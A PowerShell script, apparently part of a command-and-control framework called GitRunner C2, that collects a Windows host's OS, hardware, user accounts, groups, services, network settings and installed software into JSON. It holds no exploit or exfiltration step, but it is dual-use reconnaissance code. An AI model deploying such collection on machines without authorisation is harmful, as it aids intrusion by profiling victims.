# Endpoint inventory collector for GitRunner C2.
# Collected by ONE pipeline run and cached per endpoint; tabs read sections out
# of the resulting JSON (no per-table waiting). Volatile data (processes, event
# logs) and security-software discovery are NOT here -- those run on-demand.
#
# Every section runs inside A {} (-> array) or O {} (-> object), each with
# try/catch, so a missing cmdlet on a given host (e.g. Get-BitLockerVolume on
# Windows Server, or pwsh 7 vs Windows PowerShell 5.1 differences) yields an
# empty section instead of aborting the whole collection.
$ErrorActionPreference='SilentlyContinue'
function A($sb){ try { $r=& $sb } catch { $r=$null }; if($null -eq $r){,@()}elseif($r -is [System.Array]){,$r}else{,@($r)} }
function O($sb){ try { & $sb } catch { $null } }
$os=Get-CimInstance Win32_OperatingSystem
$cs=Get-CimInstance Win32_ComputerSystem
$bios=Get-CimInstance Win32_BIOS
$cpus=Get-CimInstance Win32_Processor
$cpu=$cpus | Select-Object -First 1
$disk=Get-CimInstance Win32_LogicalDisk -Filter "DeviceID='C:'"
$ip=(Get-NetIPAddress -AddressFamily IPv4 | Where-Object {$_.IPAddress -ne '127.0.0.1' -and $_.IPAddress -notlike '169.*'} | Select-Object -First 1).IPAddress
$lu=((Get-CimInstance Win32_Process -Filter "Name='explorer.exe'" | ForEach-Object { (Invoke-CimMethod -InputObject $_ -MethodName GetOwner).User }) | Where-Object {$_} | Sort-Object -Unique) -join ','
$apps = foreach($k in 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*','HKLM:\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*','HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*'){ Get-ItemProperty $k | Where-Object { $_.DisplayName } | Select-Object DisplayName,DisplayVersion,Publisher,InstallDate,@{n='Uninstall';e={ if($_.QuietUninstallString){$_.QuietUninstallString}else{$_.UninstallString} }} }
[PSCustomObject]@{
  summary = O({ [PSCustomObject]@{ hostname=$env:COMPUTERNAME; current_user=$([System.Security.Principal.WindowsIdentity]::GetCurrent().Name); logged_on=$(if($lu){$lu}else{$cs.UserName}); domain=$cs.Domain; ip=$ip; os=$os.Caption; os_version=$os.Version; build=$os.BuildNumber; arch=$os.OSArchitecture; registered_owner=$os.RegisteredUser; product_id=$os.SerialNumber; install_date=$os.InstallDate.ToString('yyyy-MM-dd'); last_boot=$os.LastBootUpTime.ToString('yyyy-MM-dd HH:mm'); uptime=((Get-Date)-$os.LastBootUpTime).ToString('dd\.hh\:mm\:ss'); manufacturer=$cs.Manufacturer; model=$cs.Model; serial=$bios.SerialNumber; cpu=$cpu.Name; sockets=@($cpus).Count; cores=($cpus | Measure-Object NumberOfCores -Sum).Sum; logical=($cpus | Measure-Object NumberOfLogicalProcessors -Sum).Sum; cpu_load=[math]::Round(($cpus | Measure-Object LoadPercentage -Average).Average,0); ram_gb=[math]::Round($cs.TotalPhysicalMemory/1GB,1); ram_free_gb=[math]::Round($os.FreePhysicalMemory/1MB,1); disk_free_gb=[math]::Round($disk.FreeSpace/1GB,1); disk_total_gb=[math]::Round($disk.Size/1GB,1) } })
  services = A({ Get-CimInstance Win32_Service | Select-Object Name,DisplayName,State,StartMode,StartName })
  users = A({ Get-CimInstance Win32_UserAccount -Filter "LocalAccount=True" | Select-Object Name,FullName,Disabled,Description,SID })
  groups = A({ Get-CimInstance Win32_Group -Filter "LocalAccount=True" | Select-Object Name,Description,SID })
  bios = O({ [PSCustomObject]@{ Manufacturer=$bios.Manufacturer; Version=$bios.SMBIOSBIOSVersion; Serial=$bios.SerialNumber; Released=$(if($bios.ReleaseDate){$bios.ReleaseDate.ToString('yyyy-MM-dd')}else{''}) } })
  motherboard = O({ Get-CimInstance Win32_BaseBoard | Select-Object Manufacturer,Product,SerialNumber,Version })
  processors = A({ Get-CimInstance Win32_Processor | Select-Object Name,@{n='Cores';e={$_.NumberOfCores}},@{n='Logical';e={$_.NumberOfLogicalProcessors}},@{n='MaxClockMHz';e={$_.MaxClockSpeed}} })
  memory = A({ Get-CimInstance Win32_PhysicalMemory | Select-Object @{n='Slot';e={$_.DeviceLocator}},Manufacturer,@{n='CapacityGB';e={[math]::Round($_.Capacity/1GB,1)}},@{n='SpeedMHz';e={$_.Speed}} })
  disks = A({ Get-CimInstance Win32_DiskDrive | Select-Object Model,@{n='SizeGB';e={[math]::Round($_.Size/1GB,1)}},InterfaceType,@{n='Serial';e={ if($_.SerialNumber){$_.SerialNumber.Trim()}else{''} }} })
  network = A({ Get-CimInstance Win32_NetworkAdapterConfiguration -Filter "IPEnabled=True" | Select-Object Description,MACAddress,@{n='IP';e={$_.IPAddress -join ', '}},@{n='Gateway';e={$_.DefaultIPGateway -join ', '}},@{n='DHCP';e={$_.DHCPEnabled}} })
  apps = A({ $apps })
} | ConvertTo-Json -Depth 4 -Compress
